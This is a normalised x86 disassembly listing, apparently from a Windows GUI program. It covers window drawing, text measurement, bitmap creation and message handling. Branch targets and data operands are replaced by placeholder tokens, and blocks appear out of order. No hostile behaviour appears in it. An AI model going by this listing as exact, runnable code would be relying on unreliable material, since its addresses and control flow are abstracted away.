mov [ ebp - 0x74 ] ecx
sub eax ecx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
lea eax [ ecx + ecx ]
mov edx eax
mov eax esi
sub eax edx
test [ ebp - 0x2f ] 0x2
mov [ ebp - 0x2c ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_452615
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x10 ]
add eax esi
add eax [ ebp - 0x24 ]
mov [ ebp - 0x64 ] eax
lea eax [ ebp - 0x4c ]
push eax
push esi
push [ ebp - 0x14 ]
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_452615
mov ecx [ ebp - 0x14 ]
mov eax esi
neg eax
neg ecx
push eax
lea eax [ ebp - 0x70 ]
push ecx
push eax
call [ InflateRect@IAT ]
lea eax [ ebp - 0x58 ]
neg eax
sbb eax eax
and eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push [ ebp - 0x40 ]
call [ FillRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
push esi
push [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_452615
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
sub edi [ ebp - 0x74 ]
push 0x0
push 0x1
push eax
add edi [ rw-data ]
mov eax [ ebp - 0x24 ]
lea ecx [ ecx + ecx * 2 ]
add eax edi
sub esi ecx
add esi [ rw-data ]
push eax
push [ ebp - 0x28 ]
lea ecx [ ebp - 0x44 ]
call sub_451c1c
mov eax [ ebp - 0x1c ]
push 0x0
push 0x1
sub eax edi
push [ ebp - 0x2c ]
lea ecx [ ebp - 0x44 ]
push eax
push [ ebp - 0x28 ]
call sub_451c1c
mov eax [ ebp - 0x24 ]
push 0x0
push 0x1
add eax edi
push [ ebp - 0x2c ]
lea ecx [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x2c ]
push eax
call sub_451c1c
mov eax [ ebp - 0x1c ]
push 0x0
push 0x1
sub eax edi
push [ ebp - 0x2c ]
lea ecx [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x2c ]
push eax
call sub_451c1c
mov edi [ ebp - 0x18 ]
mov eax [ ebp - 0x28 ]
push 0x0
push edi
push 0x1
add eax esi
push [ ebp - 0x24 ]
lea ecx [ ebp - 0x44 ]
push eax
call sub_451c1c
mov eax [ ebp - 0x20 ]
push 0x0
push edi
push 0x1
push [ ebp - 0x24 ]
sub eax esi
lea ecx [ ebp - 0x44 ]
push eax
call sub_451c1c
mov eax [ ebp - 0x1c ]
push 0x0
push edi
sub eax edi
push 0x1
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x44 ]
add eax esi
push eax
call sub_451c1c
mov eax [ ebp - 0x1c ]
push 0x0
push edi
sub eax edi
push 0x1
push eax
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x44 ]
sub eax esi
push eax
call sub_451c1c
mov eax [ ebp - 0x2c ]
mov ecx edi
jmp r-xdata
test [ ebp - 0x2e ] 0x8
je r-xdata
push eax
push [ ebp - 0x40 ]
call [ SelectObject@IAT ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_43f17d
mov esi [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
and esi 0x80000
lea edx [ ebp - 0x78 ]
mov ecx [ eax - 0x8 ]
push edx
neg esi
sbb esi esi
push ecx
and esi [ rw-data ]
push eax
push [ ebp - 0x3c ]
add esi [ ebp - 0x70 ]
call [ GetTextExtentPoint32A@IAT ]
mov eax [ ebp - 0x68 ]
sub eax [ ebp - 0x70 ]
cmp [ ebp - 0x78 ] eax
jg r-xdata
neg ecx
neg eax
push ecx
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ InflateRect@IAT ]
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea ecx [ ebp - 0x80 ]
call sub_446b68
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x5
neg eax
sbb eax eax
and eax [ ebp - 0x40 ]
push eax
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_446c1f
test eax eax
jne r-xdata
lea eax [ ebp - 0xb8 ]
push eax
push [ ebp - 0x3c ]
call [ GetTextMetricsA@IAT ]
mov eax [ ebp - 0xb0 ]
mov ecx [ ebp - 0xac ]
push 0x1
push 0x0
lea edi [ ecx + eax ]
lea eax [ ebp - 0x70 ]
add edi [ ebp - 0xb4 ]
push eax
call [ InflateRect@IAT ]
mov eax [ ebp - 0x64 ]
sub eax edi
sub eax [ ebp - 0x6c ]
inc eax
cdq
sub eax edx
mov edi eax
mov eax [ ebp - 0x50 ]
sar edi 0x1
mov eax [ eax + 0xc4 ]
neg eax
sbb eax eax
and al 0xf6
add eax 0x13
push eax
call ebx
push eax
lea ecx [ ebp - 0x44 ]
call sub_446ee0
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_446e28
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x6c ]
push 0x0
add edx edi
mov ecx [ eax - 0x8 ]
push ecx
push eax
lea eax [ ebp - 0x70 ]
push eax
push 0x4
push edx
push esi
push [ ebp - 0x40 ]
call [ ExtTextOutA@IAT ]
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x6
lea ecx [ ebp - 0x44 ]
call sub_4472be
mov eax [ ebp - 0x68 ]
sub eax esi
cdq
sub eax edx
sar eax 0x1
add esi eax
mov esi r--data
mov [ ebp - 0x58 ] esi
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x9
call sub_4477b8
mov [ ebp - 0x60 ] esi
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0xa
call sub_4477b8
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x4 ] 0xb
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_446c9d
mov esi r--data
mov [ ebp - 0x58 ] esi
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x6
call sub_4477b8
mov [ ebp - 0x60 ] esi
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x7
call sub_4477b8
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x3
call sub_442148
push [ ebp - 0x18 ]
push [ ebp - 0x40 ]
call [ SelectObject@IAT ]
xor esi esi
push eax
push [ ebp - 0x7c ]
call [ SelectObject@IAT ]
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0x4c ]
call sub_4477b8
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x44 ]
call sub_4475df
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_446c9d
push esi
push [ ebp - 0x7c ]
call [ SelectObject@IAT ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x80 ]
mov edx [ rw-data ]
push 0xcc0020
neg eax
sbb eax eax
push 0x0
and eax [ ebp - 0x7c ]
push 0x0
push eax
push ecx
push edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push [ ebp - 0x40 ]
call [ BitBlt@IAT ]
test esi esi
je r-xdata
sub_452c2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
call sub_44163f
mov ebx eax
test ebx 0x80000000
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_4501e6
mov eax [ ebp + 0x8 ]
and eax 0xfff0
cmp eax 0xf060
jne r-xdata
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_44044d
test eax eax
jne r-xdata
mov edi [ GetKeyState@IAT ]
push 0x73
call edi
test ax ax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x12
call edi
test ax ax
jge r-xdata
test bh 0x1
je r-xdata
sub_452c94
cmp [ rw-data ] 0x0
push esi
je r-xdata
push edi
call sub_44163f
mov edi eax
test edi 0x40600
je r-xdata
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_440422
jmp r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x6
call esi
push eax
push 0x5
mov esi [ GetSystemMetrics@IAT ]
push 0x21
call esi
push eax
push 0x20
jmp r-xdata
pop esi
retn 0x8
mov eax [ rw-data ]
sub [ esi + 0x4 ] eax
call esi
mov esi [ esp + 0x10 ]
push eax
push esi
call [ InflateRect@IAT ]
test edi 0xc00000
pop edi
je r-xdata
sub_452cfc
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
je r-xdata
test [ ebp + 0xc ] 0x40600
je r-xdata
push 0x188
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ AdjustWindowRectEx@IAT ]
jmp r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x6
call esi
push eax
push 0x5
mov esi [ GetSystemMetrics@IAT ]
push 0x21
call esi
push eax
push 0x20
jmp r-xdata
pop esi
pop ebp
retn 0xc
call sub_451d69
mov eax [ rw-data ]
sub [ esi + 0x4 ] eax
call esi
mov esi [ ebp + 0x8 ]
push eax
push esi
call [ InflateRect@IAT ]
test [ ebp + 0xe ] 0xc0
je r-xdata
sub_452d68
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
mov edi [ esp + 0xc ]
lea esi [ ecx + 0xc8 ]
push edi
push [ esi ]
push [ esp + 0x18 ]
call [ lstrcpynA@IAT ]
mov eax [ esi ]
mov eax [ eax - 0x8 ]
cmp edi eax
jle r-xdata
call sub_43e71a
jmp r-xdata
mov eax edi
pop edi
pop esi
mov edi eax
retn 0x8
sub_452dbf
mov eax sub_464ba0
call sub_42dc88
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
mov [ ebp - 0x10 ] esp
mov esi ecx
je r-xdata
cmp [ ebp + 0xc ] edi
mov [ ebp - 0x4 ] edi
jne r-xdata
call sub_43e71a
jmp r-xdata
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
push eax
lea ecx [ esi + 0xc8 ]
call sub_4425ef
push [ ebp + 0xc ]
push eax
call [ lstrcpyA@IAT ]
lea ecx [ esi + 0xc8 ]
call sub_4420d3
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
push edi
push edi
push 0x85
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
sub_452e46
push ecx
push ebx
push ebp
push esi
xor ebp ebp
push edi
mov esi ecx
mov [ esp + 0x10 ] ebp
call sub_44163f
mov ebx [ esp + 0x18 ]
mov edi 0x100
test edi eax
je r-xdata
test bl 0x3
je r-xdata
test bl 0x40
je r-xdata
test bl 0x30
je r-xdata
mov eax ebx
mov ecx esi
and al 0x1
neg al
sbb eax eax
and al 0xc0
add eax 0x80
or al 0x17
push eax
push ebp
push ebp
push ebp
push ebp
push ebp
call sub_4417b0
mov [ esp + 0x10 ] 0x1
test bl 0xc
je r-xdata
mov eax ebx
mov ecx esi
shr eax 0x4
and eax 0x1
push eax
call sub_441841
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
mov ecx esi
call sub_44163f
test edi eax
je r-xdata
push ebp
push ebp
push edi
mov ecx esi
call sub_441673
shr ebx 0x2
and ebx 0x1
push ebp
push ebx
push 0x86
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push ebp
push edi
push ebp
mov ecx esi
call sub_441673
sub_452ef0
push esi
push [ ecx + 0x1c ]
call [ GetParent@IAT ]
push 0x0
mov esi eax
push 0x0
push 0x36b
push esi
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0x8
mov eax esi
sub_452f1c
mov eax sub_463125
call sub_42dc88
push ecx
push 0x3c
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_43e388
sub_452f54
mov eax sub_46313a
call sub_42dc88
push ecx
push esi
mov ecx rw-data
call sub_426554
mov esi eax
mov [ ebp - 0x10 ] esi
xor eax eax
cmp esi eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov ecx esi
call sub_43e388
mov [ esi ] r--data
mov eax esi
sub_452fff
mov eax sub_46314d
call sub_42dc88
push ecx
push 0x118
call sub_454d77
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_4532a3
sub_453033
mov eax sub_463161
call sub_42dc88
push ecx
push 0x10
call sub_454d77
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_453cd6
sub_4530b7
push esi
mov ecx rw-data
call sub_426554
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_43c396
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_453148
push ebp
mov ebp esp
sub esp 0x90
push ebx
push esi
push edi
call [ GetMenuCheckMarkDimensions@IAT ]
movsx ebx ax
shr eax 0x10
movsx ecx ax
cmp ebx 0x20
mov [ ebp - 0xc ] ecx
jle r-xdata
lea eax [ ebx - 0x4 ]
lea esi [ ebx + 0xf ]
cdq
sub eax edx
sar esi 0x4
mov edi eax
mov eax esi
sar edi 0x1
shl eax 0x4
add edi eax
sub edi ebx
cmp edi 0xc
jle r-xdata
push 0x20
pop ebx
push 0x20
pop eax
cmp ecx eax
jle r-xdata
push 0xc
pop edi
push 0x80
lea eax [ ebp - 0x90 ]
push 0xff
push eax
call sub_42dc30
mov eax [ ebp - 0xc ]
add esp 0xc
add eax 0xfffffffa
mov [ ebp - 0x4 ] r--data
sar eax 0x1
imul eax esi
add esi esi
mov [ ebp - 0x8 ] 0x5
lea edx [ ebp + eax * 2 - 0x90 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx edi
movzx ax [ eax ]
shl eax cl
inc [ ebp - 0x4 ]
xor ecx ecx
not eax
mov cl ah
mov [ edx + 0x1 ] al
mov [ edx ] cl
add edx esi
dec [ ebp - 0x8 ]
jne r-xdata
lea eax [ ebp - 0x90 ]
push eax
push 0x1
push 0x1
push [ ebp - 0xc ]
push ebx
call [ CreateBitmap@IAT ]
pop edi
pop esi
test eax eax
mov [ rw-data ] eax
pop ebx
jne r-xdata
leave
retn
push 0x7fe3
push eax
call [ LoadBitmapA@IAT ]
mov [ rw-data ] eax
sub_4532d5
mov eax sub_46368c
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0xcc ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xcc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
push eax
call edi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call sub_42ded6
pop ecx
sub_45337f
mov eax ecx
xor edx edx
lea ecx [ eax + 0x103c ]
mov [ eax + 0x1c ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
or [ eax + 0x104c ] 0xffffffff
lea ecx [ eax + 0x1048 ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov cl [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x28 ] 0x1c
mov [ eax + 0x20 ] 0x14
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] cl
mov [ eax + 0x30 ] 0x1
mov [ eax + 0x1040 ] 0x18
retn 0x4
sub_4533fd
mov eax sub_4636ae
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x1044 ]
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ esi + 0x106c ]
lea edi [ esi + 0x106c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1070 ]
call sub_455205
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
lea edx [ esi + 0x1048 ]
push edx
call [ eax + 0xc ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_4534ac
mov eax sub_4636c0
call sub_42dc88
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
call sub_43cf19
push eax
call sub_441eb2
pop ecx
mov ecx [ esi + 0x38 ]
jmp r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
sub_4535b8
push esi
mov esi ecx
lea eax [ esi + 0x20 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x1c ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x8 ] 0x0
sub_453603
push esi
push 0x1074
call sub_454d77
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x1
mov ecx esi
call sub_45337f
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_45364b
mov eax sub_463791
call sub_42dc88
push ecx
push 0xbc
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_44f1fe
sub_453686
push esi
mov esi ecx
call sub_455720
push 0x2
xor ecx ecx
pop eax
mov [ esi ] r--data
mov [ esi + 0x48 ] eax
cmp [ rw-data ] ecx
je r-xdata
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x4c ] 0x1
mov [ esi + 0x40 ] ecx
mov [ esi + 0x44 ] ecx
mov [ esi + 0x4c ] ecx
jmp r-xdata
mov [ esi + 0x78 ] ecx
mov eax esi
pop esi
retn
sub_4536df
mov eax sub_4637a4
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor eax eax
push eax
push eax
mov [ ebp - 0x4 ] eax
call sub_453908
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_44af64
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_453730
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
push esi
mov esi ecx
push edi
mov ecx eax
and eax 0xffbf004e
and ecx r-xdata
or al 0x4e
mov [ esi + 0x64 ] ecx
mov ecx [ ebp + 0x8 ]
mov edi eax
call sub_44163f
test eax 0x40000
je r-xdata
push 0x1000
call sub_44121e
lea eax [ ebp - 0x10 ]
push eax
call [ SetRectEmpty@IAT ]
push 0x0
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
or eax edi
push eax
push 0x0
push r--data
call sub_43edf5
pop edi
pop esi
leave
retn 0x10
or edi 0x100
sub_4537cf
mov eax sub_4637b8
call sub_42dc88
sub esp 0x2c
push edi
push 0x14
push [ ebp + 0xc ]
mov edi ecx
mov [ ebp - 0x1c ] edi
call sub_453908
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
mov [ ebp - 0x18 ] 0x1
je r-xdata
push 0x1
push 0x1
mov ecx edi
call sub_4539dc
mov eax [ ebp - 0x18 ]
pop ebx
push esi
push ebx
push ebx
push 0x31
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
push ebx
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_4474b9
cmp esi ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
mov edi [ edi + 0x5c ]
mov [ ebp - 0x10 ] ebx
jle r-xdata
push esi
push [ ebp - 0x34 ]
call [ SelectObject@IAT ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] ebx
pop esi
je r-xdata
lea esi [ edi + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x38 ]
call sub_44752b
mov edi [ ebp - 0x1c ]
push [ ebp - 0x14 ]
push [ ebp - 0x34 ]
call [ SelectObject@IAT ]
push ebx
call [ GetSystemMetrics@IAT ]
push 0x4
cdq
pop ecx
idiv ecx
cmp [ ebp - 0x10 ] ebx
mov [ esi - 0xc ] eax
jne r-xdata
push eax
mov ecx esi
call sub_4437c6
test eax eax
je r-xdata
add edi 0x14
add esi 0x14
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
jl r-xdata
or [ esi - 0x8 ] 0x8000100
mov [ ebp - 0x18 ] ebx
mov eax [ esi ]
lea edx [ ebp - 0x24 ]
push edx
mov ecx [ eax - 0x8 ]
push ecx
push eax
push [ ebp - 0x30 ]
call [ GetTextExtentPoint32A@IAT ]
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x1c ]
mov [ esi - 0xc ] eax
mov eax [ esi ]
push ebx
push eax
push [ ebp - 0x10 ]
call sub_44987b
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov eax [ eax ]
or [ esi - 0x4 ] 0x1
cmp eax ebx
mov [ edi ] eax
je r-xdata
jmp r-xdata
jmp r-xdata
sub_453908
push ebx
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x58 ] edi
mov eax [ esi + 0x5c ]
jle r-xdata
push [ esp + 0x14 ]
mov ecx esi
push [ esp + 0x14 ]
call sub_455810
test eax eax
je r-xdata
lea ebx [ eax + 0x10 ]
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ esi + 0x5c ]
xor edi edi
cmp [ esi + 0x58 ] edi
jle r-xdata
mov ecx ebx
call sub_442148
add ebx 0x14
inc edi
cmp edi [ esi + 0x58 ]
jl r-xdata
push 0x1
pop eax
lea ebx [ eax + 0x10 ]
push 0x4
push rw-data
push ebx
call sub_42e2d0
add esp 0xc
add ebx 0x14
inc edi
cmp edi [ esi + 0x58 ]
jl r-xdata
sub_45396c
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
push [ ebp + 0xc ]
push ebx
call sub_44be6a
mov ecx esi
call sub_44163f
test ah 0x1
je r-xdata
pop esi
pop ebx
leave
retn 0x8
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call [ IsZoomed@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0xc ]
push edi
push ecx
push 0x0
push 0x407
mov ecx esi
call [ eax + 0xa0 ]
mov edi [ GetSystemMetrics@IAT ]
push 0x5
call edi
mov esi [ ebx + 0x8 ]
push 0x2
shl eax 0x1
sub esi eax
sub esi [ ebp - 0xc ]
call edi
sub esi eax
pop edi
mov [ ebx + 0x8 ] esi
sub_4539dc
push ebp
mov ebp esp
sub esp 0x28
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
push esi
push edi
mov esi ecx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ OffsetRect@IAT ]
lea eax [ ebp - 0x28 ]
push 0x1
push eax
mov ecx esi
call sub_45396c
mov eax [ esi ]
lea ecx [ ebp - 0x18 ]
push ecx
push ebx
push 0x407
mov ecx esi
call [ eax + 0xa0 ]
mov edi [ ebp - 0x20 ]
mov eax [ esi + 0x5c ]
sub edi [ ebp - 0x28 ]
mov [ ebp + 0x8 ] ebx
mov ebx [ esi + 0x58 ]
add edi [ ebp - 0x10 ]
test ebx ebx
jle r-xdata
lea esp [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ esi + 0x58 ] ebx
mov eax [ esi + 0x5c ]
jle r-xdata
mov eax ebx
shl eax 0x2
add eax 0x3
and al 0xfc
call sub_42f0a0
and [ ebp - 0x8 ] 0x0
mov ecx [ ebp - 0x18 ]
mov eax esp
test ebx ebx
mov [ ebp - 0xc ] eax
jle r-xdata
add eax 0x4
mov ecx ebx
lea edi [ eax + 0x10 ]
push [ ebp - 0xc ]
mov eax [ esi ]
mov ecx esi
push [ esi + 0x58 ]
push 0x404
call [ eax + 0xa0 ]
xor ebx ebx
mov ebx [ esi + 0x5c ]
mov [ ebp - 0x4 ] eax
add ebx 0x8
push 0xfffffffa
pop edx
sub edx [ eax ]
add eax 0x14
sub edx [ ebp - 0x10 ]
add edi edx
dec ecx
jne r-xdata
inc [ ebp + 0x8 ]
add edi 0x14
inc ebx
cmp ebx [ esi + 0x58 ]
jl r-xdata
push 0x1
mov ecx esi
push [ edi ]
push ebx
call sub_44987b
mov eax [ ebp - 0x4 ]
add [ ebp - 0x4 ] 0x4
add ebx 0x14
mov [ eax ] ecx
add ecx [ ebp - 0x10 ]
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ esi + 0x58 ]
jl r-xdata
test edi edi
jle r-xdata
test [ eax + 0x7 ] 0x8
je r-xdata
test [ edi - 0x4 ] 0x1
je r-xdata
mov eax [ ebx - 0x4 ]
test [ ebx + 0x3 ] 0x8
lea ecx [ ecx + eax + 0x6 ]
je r-xdata
mov eax edi
cdq
idiv [ ebp + 0x8 ]
add ecx eax
dec [ ebp + 0x8 ]
sub edi eax
sub_453b1c
push esi
mov esi ecx
call sub_455720
xor eax eax
push 0x3
mov [ esi + 0x98 ] eax
mov [ esi + 0x78 ] eax
mov [ esi + 0x7c ] eax
mov [ esi + 0x80 ] eax
pop eax
mov [ esi ] r--data
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
mov [ esi + 0x84 ] 0x1
mov [ esi + 0x88 ] 0x10
mov [ esi + 0x8c ] 0xf
mov [ esi + 0x90 ] 0x17
mov [ esi + 0x94 ] 0x16
mov eax esi
pop esi
retn
sub_453b99
mov eax sub_4637d8
call sub_42dc88
push ecx
push esi
